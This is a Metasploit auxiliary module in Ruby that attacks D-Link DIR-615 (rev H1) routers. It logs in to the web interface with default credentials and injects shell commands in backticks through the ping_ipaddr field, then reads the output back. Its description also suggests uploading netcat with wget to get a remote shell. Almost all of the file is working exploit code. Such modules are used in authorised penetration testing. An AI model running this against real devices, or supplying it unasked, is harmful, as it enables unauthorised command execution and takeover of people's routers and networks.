##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'D-Link DIR-615 (rev H1) Remote Command Execution',
			'Description'     => %q{
					Some D-Link Routers are vulnerable to OS Command injection.
				You will need credentials to the webinterface to access the vulnerable part
				of the application. Default credentials are allways a good starting point.
				admin/admin or admin and blank password could be a first try.
				Note: You will just get the last line of the output back. So it is a bit bad
				if you have commands with output over multiple lines ...

				Hint: To get a remote shell you will need a cross compiled netcat, upload it via wget
				and execute this stuff. Have phun

				Tested on the following device:
					* DIR-615 Hardware revision H1, Firmware version 8.04
			},
			'Author'          => [ 'm-1-k-3' ],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
					[ 'URL', 'http://www.dlink.de/cs/Satellite?c=Product_C&childpagename=DLinkEurope-DE%2FDLTechProduct&cid=1197374950653&p=1197318958220&packedargs=QuickLinksParentID%3D1197318958220%26locale%3D1195806663795&pagename=DLinkEurope-DE%2FDLWrapper' ],
					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-008' ],
					[ 'EDB', '24477' ],
					[ 'BID', '57882' ],
					[ 'OSVDB', '90174' ]
				],
			'DisclosureDate' => 'Jan 07 2013'))

		register_options(
			[
				OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
				OptString.new('PASSWORD',[ true, 'Password to login with', 'admin']),
				OptString.new('CMD', [ true, 'The command to execute', 'uname -a'])
			], self.class)
	end

	def run
		uri = '/tools_vct.htm'
		user = datastore['USERNAME']
		if datastore['PASSWORD'].nil?
			pass = ""
		else
			pass = datastore['PASSWORD']
		end

		print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")

		login_path = "/login.htm"
		#original login request
		#login_data = "page=login&submitType=0&identifier=&sel_userid=#{user}&userid=&passwd=#{pass}&captchapwd="

		#valid login response includes the following
		login_check = "showMainTabs.*setup"

		begin
			res = send_request_cgi({
				'uri'	  => login_path,
				'method'   => 'POST',
				'vars_post' => {
					"page" => "login",
					"submitType" => "0",
					"identifier" => "",
					"sel_userid" => "#{user}",
					"userid" => "",
					"passwd" => "#{pass}",
					"captchapwd" => ""
					}
			})
			return if res.nil?
			return if (res.code == 404)

			if (res.body) =~ /#{login_check}/
				print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
			else
				print_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
				return
			end

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return
		end

		print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])

		#original request
		#data_cmd = "page=tools_vct&hping=0&ping_ipaddr=`#{datastore['CMD']}; echo end`&ping6_ipaddr="

		res = send_request_cgi(
			{
				'uri'	=> uri,
				'method' => 'POST',
				'vars_post' => {
					"page" => "tools_vct",
					"hping" => "0",
					"ping_ipaddr" => "`#{datastore['CMD']}; echo end`",
					"ping6_ipaddr" => ""
					}
			})

		if res.body.include? "end"
			print_good("#{rhost}:#{rport} - Exploited successfully")
			#vprint_line("#{res.body}")
		else
			print_status("#{rhost}:#{rport} - Exploit failed.")
		end
		res.body.each_line do |line|
			#our output line includes "var pingip=" -> lets strip it
			if line.to_s =~ /var\ pingip=/
				line = line.gsub(/.*var\ pingip\=/,'')
				line = line.gsub(/end\";/,'')
				line = line.gsub(/\"ipv4_/,'')
				vprint_status("#{rhost}:#{rport} - Command: #{datastore['CMD']}")
				vprint_status("#{rhost}:#{rport} - Output: ")
				vprint_status("#{line}")
				break
			end
		end
	end
end
